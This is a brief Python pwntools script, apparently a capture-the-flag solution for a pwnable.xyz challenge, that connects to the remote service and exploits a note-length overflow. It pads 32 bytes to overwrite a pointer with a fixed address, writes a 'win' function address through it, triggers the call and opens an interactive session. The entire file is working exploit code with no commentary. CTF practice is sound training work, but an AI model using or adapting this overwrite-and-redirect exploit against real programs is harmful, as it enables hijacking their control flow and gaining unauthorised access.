from pwn import *

#r = process("./challenge")
r = remote("svc.pwnable.xyz", 30016)

read_addr = 0x601248
win_addr = 0x40093c

r.sendlineafter("> ", "1")
r.sendlineafter("len? ", str(32 + 9))
r.sendlineafter("note: ", "A" * 32 + p64(read_addr))
r.sendlineafter("> ", "2")
r.sendlineafter("desc: ", p64(win_addr))
r.sendlineafter("> ", "2")

r.interactive()

r.close()
